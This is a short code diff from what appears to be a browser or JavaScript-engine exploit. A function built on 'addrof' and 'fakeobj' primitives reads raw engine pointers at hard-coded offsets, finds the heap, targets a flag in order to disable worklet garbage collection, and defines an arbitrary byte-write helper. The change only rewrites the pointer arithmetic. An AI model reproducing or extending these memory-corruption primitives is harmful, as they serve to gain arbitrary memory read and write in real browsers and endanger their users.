@@ -239,9 +239,9 @@ function buildDSScribblePrimitives(addrof, fakeobj) {
             ///DISABLE WORKLET GC
             const vm = read64(read64(addrof(globalThis) + 0x10n) + 0x38n);
             log("vm:" + vm);
-            const heap = vm.add(0xc0n);
+            const heap = vm + 0xc0n;
             log("heap:" + heap);
-            const isSafeToCollect = heap.add(0x241n);
+            const isSafeToCollect = heap + 0x241n;
             function write8(ptr, u16) {
                     let value = read64(ptr);
                     value &= ~0xffn;
